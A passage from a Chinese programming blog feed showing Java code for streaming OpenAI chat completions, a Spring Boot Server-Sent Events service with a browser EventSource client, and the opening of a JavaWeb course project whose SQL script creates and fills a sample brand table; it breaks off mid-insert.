    <span class="hljs-type">OpenAiService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAiService</span>(api);
    <span class="hljs-comment">//        CompletionRequest completionRequest = CompletionRequest.builder()</span>
    <span class="hljs-comment">//                .model(&quot;gpt-3.5-turbo&quot;)</span>
    <span class="hljs-comment">//                .prompt(&quot;你知道java中的泛型是什么吗&quot;)</span>
    <span class="hljs-comment">//                .temperature(0.5)</span>
    <span class="hljs-comment">//                .maxTokens(2048)</span>
    <span class="hljs-comment">//                .topP(1D)</span>
    <span class="hljs-comment">//                .build();</span>

    <span class="hljs-type">ChatCompletionRequest</span> <span class="hljs-variable">completionRequest</span> <span class="hljs-operator">=</span> ChatCompletionRequest.builder()
        .model(<span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>)
        .stream(<span class="hljs-literal">true</span>)
        .messages(list)
        .build();
    <span class="hljs-comment">//        service.createChatCompletion(completionRequest).getChoices().forEach(System.out::println);</span>
    service.streamChatCompletion(completionRequest).doOnError(Throwable::printStackTrace)
        .blockingForEach(chunk -&gt; &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> chunk.getChoices().get(<span class="hljs-number">0</span>).getMessage().getContent();
            <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;
                <span class="hljs-keyword">return</span>;
            &#125;
            System.out.print(text);
            <span class="hljs-comment">//                    sseService.send(user.getIdUser(), text);</span>
        &#125;);
&#125;</code></pre>

<p>添加代理后，就能正常使用openai的api了</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230627200620750.png" alt="image-20230627200620750"></p>
<h1 id="实现每个用户独占一个对话框"><a href="#实现每个用户独占一个对话框" class="headerlink" title="实现每个用户独占一个对话框"></a>实现每个用户独占一个对话框</h1><p>在实现对话之前，需要了解一种技术SSE(Server-Sent Events)，是一种基于 HTTP 的服务器推送技术，它可以让服务端向客户端实时发送数据，而不需要客户端不断地发起请求。</p>
<p>在 Spring Boot 中，可以使用 SseEmitter 类来实现 SSE。SseEmitter 类是 Spring 框架提供的用于将服务器端数据异步地发送到客户端的类。</p>
<p>实现sse功能的代码</p>
<h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><h3 id="服务层"><a href="#服务层" class="headerlink" title="服务层"></a>服务层</h3><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SseServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SseService</span> &#123;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;Long, SseEmitter&gt; sessionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 该方法用于建立SSE连接</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> idUser</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SseEmitter <span class="hljs-title function_">connect</span><span class="hljs-params">(Long idUser)</span> &#123;
        <span class="hljs-keyword">if</span> (existsUser(idUser)) &#123;
            removeUser(idUser);
        &#125;
        <span class="hljs-comment">// 0L表示永不超时</span>
        <span class="hljs-type">SseEmitter</span> <span class="hljs-variable">sseEmitter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SseEmitter</span>(<span class="hljs-number">0L</span>);
        sseEmitter.onError((err) -&gt; &#123;
            log.error(<span class="hljs-string">&quot;type: SseSession Error, msg: &#123;&#125; session Id : &#123;&#125;&quot;</span>, err.getMessage(), idUser);
            onError(idUser, err);
        &#125;);

        sseEmitter.onTimeout(() -&gt; &#123;
            log.info(<span class="hljs-string">&quot;type: SseSession Timeout, session Id : &#123;&#125;&quot;</span>, idUser);
            removeUser(idUser);
        &#125;);

        sseEmitter.onCompletion(() -&gt; &#123;
            log.info(<span class="hljs-string">&quot;type: SseSession Completion, session Id : &#123;&#125;&quot;</span>, idUser);
            removeUser(idUser);
        &#125;);
        addUser(idUser, sseEmitter);
        log.info(<span class="hljs-string">&quot;type: SseSession Connect, session Id : &#123;&#125;&quot;</span>, idUser);
        <span class="hljs-keyword">return</span> sseEmitter;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 用于向指定用户发送消息</span>
<span class="hljs-comment">     * 首先，该方法会检查用户是否存在于sessionMap中。</span>
<span class="hljs-comment">     * 如果存在，则调用相应用户的SseEmitter对象的send方法发送消息内容；</span>
<span class="hljs-comment">     * 如果不存在，则抛出IllegalArgumentException异常。</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> idUser</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> content</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">send</span><span class="hljs-params">(Long idUser, String content)</span> &#123;
        <span class="hljs-keyword">if</span> (existsUser(idUser)) &#123;
            <span class="hljs-keyword">try</span> &#123;
                sendMessage(idUser, content);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">catch</span> (IOException exception) &#123;
                log.error(<span class="hljs-string">&quot;type: SseSession send Error:IOException, msg: &#123;&#125; session Id : &#123;&#125;&quot;</span>, exception.getMessage(), idUser);
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;User Id &quot;</span> + idUser + <span class="hljs-string">&quot; not Found&quot;</span>);
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 该方法用于关闭指定用户的SSE连接</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> idUser</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">(Long idUser)</span> &#123;
        log.info(<span class="hljs-string">&quot;type: SseSession Close, session Id : &#123;&#125;&quot;</span>, idUser);
        removeUser(idUser);
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(Long idUser, SseEmitter sseEmitter)</span> &#123;
        sessionMap.put(idUser, sseEmitter);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 该方法用于处理SSE连接出现错误的情况</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> sessionKey</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> throwable</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Long sessionKey, Throwable throwable)</span> &#123;
        <span class="hljs-type">SseEmitter</span> <span class="hljs-variable">sseEmitter</span> <span class="hljs-operator">=</span> sessionMap.get(sessionKey);
        <span class="hljs-keyword">if</span> (sseEmitter != <span class="hljs-literal">null</span>) &#123;
            sseEmitter.completeWithError(throwable);
        &#125;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 移除会话中的用户</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> idUser</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeUser</span><span class="hljs-params">(Long idUser)</span> &#123;
        sessionMap.remove(idUser);
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">existsUser</span><span class="hljs-params">(Long idUser)</span> &#123;
        <span class="hljs-keyword">return</span> sessionMap.containsKey(idUser);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 向用户发送消息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> idUser</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> content</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(Long idUser, String content)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        sessionMap.get(idUser).send(content);
        log.info(<span class="hljs-string">&quot;send to &#123;&#125; : &#123;&#125;&quot;</span>, idUser, content);
    &#125;
&#125;</code></pre>

<h3 id="web层"><a href="#web层" class="headerlink" title="web层"></a>web层</h3><p>比较简单，首先要建立连接，把订阅放到容器中，服务端才能知道向哪里发送消息</p>
<p>需要注意的是，使用SseEmitter我们不再需要在@GetMapping上写produces &#x3D; “text&#x2F;event-stream; charset&#x3D;utf-8”</p>
<pre><code class="hljs java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/api/v1/sse&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeeController</span> &#123;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> SseService sseService;

    <span class="hljs-meta">@GetMapping(value = &quot;/subscribe/&#123;idUser&#125;&quot;, produces = &#123;MediaType.TEXT_EVENT_STREAM_VALUE&#125;)</span>
    <span class="hljs-keyword">public</span> SseEmitter <span class="hljs-title function_">subscribe</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long idUser)</span> &#123;
        <span class="hljs-keyword">return</span> sseService.connect(idUser);
    &#125;

    <span class="hljs-meta">@GetMapping(value = &quot;/close/&#123;idUser&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long idUser)</span> &#123;
        sseService.close(idUser);
    &#125;
    
    <span class="hljs-meta">@GetMapping(&quot;/send&quot;)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;
        sseService.send(<span class="hljs-number">9L</span>, <span class="hljs-string">&quot;hello world!&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;
    &#125;
&#125;</code></pre>

<h2 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h2><p><strong>SSE的基本特性：</strong></p>
<ul>
<li>HTML5中的协议，是基于纯文本的简单协议；</li>
<li>在游览器端可供JavaScript使用的EventSource对象</li>
</ul>
<p>EventSource提供了三个标准事件，同时默认支持断线重连</p>
<table>
<thead>
<tr>
<th>事件</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>onopen</td>
<td>当成功与服务器建立连接时产生</td>
</tr>
<tr>
<td>onmessage</td>
<td>当收到服务器发来的消息时发生</td>
</tr>
<tr>
<td>onerror</td>
<td>当出现错误时发生</td>
</tr>
</tbody></table>
<blockquote>
<p>传输的数据有格式上的要求，必须为 [data:…\n…\n]或者是[retry:10\n]， 但是使用SseEmitter时不用使用该格式</p>
</blockquote>
<pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SseEmitter<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>sse测试<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">    <span class="hljs-keyword">var</span> source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;http://localhost:8099/api/v1/sse/subscribe/9&#x27;</span>);</span>
<span class="language-javascript">    source.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;</span>
<span class="language-javascript">        text = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;result&#x27;</span>).<span class="hljs-property">innerText</span>;</span>
<span class="language-javascript">        text += <span class="hljs-string">&#x27;\n&#x27;</span> + event.<span class="hljs-property">data</span>;</span>
<span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;result&#x27;</span>).<span class="hljs-property">innerText</span> = text;</span>
<span class="language-javascript">    &#125;;</span>
<span class="language-javascript">    <span class="hljs-comment">// &lt;!-- 添加一个开启回调 --&gt;</span></span>
<span class="language-javascript">    source.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;</span>
<span class="language-javascript">        text = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;result&#x27;</span>).<span class="hljs-property">innerText</span>;</span>
<span class="language-javascript">        text += <span class="hljs-string">&#x27;\n 开启: &#x27;</span>;</span>
<span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event);</span>
<span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;result&#x27;</span>).<span class="hljs-property">innerText</span> = text;</span>
<span class="language-javascript">    &#125;;</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>首先访问html页面，访问后建立连接，之后访问<code>&#39;http://localhost:8099/api/v1/sse/send</code>，向前端发送数据</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230701163145645.png" alt="image-20230701163145645"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230701163024619.png" alt="image-20230701163024619"></p>
<p>从前端页面现实的数据与后端日志记录可以看到已经成功完成了，由服务端向客户端推送消息的功能。</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>javaweb</title>
    <url>/2022/03/30/javaweb/</url>
    <content><![CDATA[<h1 id="Javaweb基础项目"><a href="#Javaweb基础项目" class="headerlink" title="Javaweb基础项目"></a>Javaweb基础项目</h1><p>学完 javaweb 做的小项目</p>
<h2 id="综合案例需求与准备"><a href="#综合案例需求与准备" class="headerlink" title="综合案例需求与准备"></a>综合案例需求与准备</h2><p><strong>今日目标：</strong></p>
<blockquote>
<ul>
<li>能够完成查询所有功能</li>
<li>能够完成添加功能</li>
<li>能够理解 BaseServlet 思想</li>
<li>能够完成批量删除功能</li>
<li>能够完成分页查询功能</li>
<li>能够完成条件查询功能</li>
</ul>
</blockquote>
<h3 id="1，功能介绍"><a href="#1，功能介绍" class="headerlink" title="1，功能介绍"></a>1，功能介绍</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825171411003.png" alt="image-20210825171411003"></p>
<p>以上是我们在综合案例要实现的功能。对数据的除了对数据的增删改查功能外，还有一些复杂的功能，如 <code>批量删除</code>、<code>分页查询</code>、<code>条件查询</code> 等功能</p>
<ul>
<li><code>批量删除</code> 功能：每条数据前都有复选框，当我选中多条数据并点击 <code>批量删除</code> 按钮后，会发送请求到后端并删除数据库中指定的多条数据。</li>
<li><code>分页查询</code> 功能：当数据库中有很多数据时，我们不可能将所有的数据展示在一页里，这个时候就需要分页展示数据。</li>
<li><code>条件查询</code> 功能：数据库量大的时候，我们就需要精确的查询一些想看到的数据，这个时候就需要通过条件查询。</li>
</ul>
<p>这里的 <code>修改品牌</code> 和 <code>删除品牌</code> 功能在课程上不做讲解，留作同学来下的练习。</p>
<h3 id="2，环境准备"><a href="#2，环境准备" class="headerlink" title="2，环境准备"></a>2，环境准备</h3><p>环境准备我们主要完成以下两件事即可</p>
<ul>
<li>将资料的 brand-case 模块导入到 idea中</li>
<li>执行资料中提供的 tb_brand.sql脚本</li>
</ul>
<p>在没有资料的情况下在idea中创建<code>maven</code>的web项目可以使用下面的方法</p>
<p><code>file</code> -&gt; <code>new</code> -&gt; <code>module</code>-&gt;<code>Maven</code>-&gt;<code>Create from archetype</code>-&gt;<code>maven archetype</code>-&gt;<code>next</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330133227350.png" alt="image-20220330133227350"></p>
<h4 id="2-1-工程准备"><a href="#2-1-工程准备" class="headerlink" title="2.1  工程准备"></a>2.1  工程准备</h4><p>将 <code>04-资料\01-初始工程</code> 中的 <code>brand-case</code> 工程导入到我们自己的 idea 中。工程结构如下：</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825195522904.png" alt="image-20210825195522904" style="zoom:80%;">

<h4 id="2-2-创建表"><a href="#2-2-创建表" class="headerlink" title="2.2  创建表"></a>2.2  创建表</h4><p>下面是创建表的语句</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 删除tb_brand表</span>
<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> tb_brand;
<span class="hljs-comment">-- 创建tb_brand表</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_brand (
    <span class="hljs-comment">-- id 主键</span>
    id           <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key auto_increment,
    <span class="hljs-comment">-- 品牌名称</span>
    brand_name   <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
    <span class="hljs-comment">-- 企业名称</span>
    company_name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),
    <span class="hljs-comment">-- 排序字段</span>
    ordered      <span class="hljs-type">int</span>,
    <span class="hljs-comment">-- 描述信息</span>
    description  <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>),
    <span class="hljs-comment">-- 状态：0：禁用  1：启用</span>
    status       <span class="hljs-type">int</span>
);
<span class="hljs-comment">-- 添加数据</span>
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> tb_brand (brand_name, company_name, ordered, description, status)
<span class="hljs-keyword">values</span> 
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
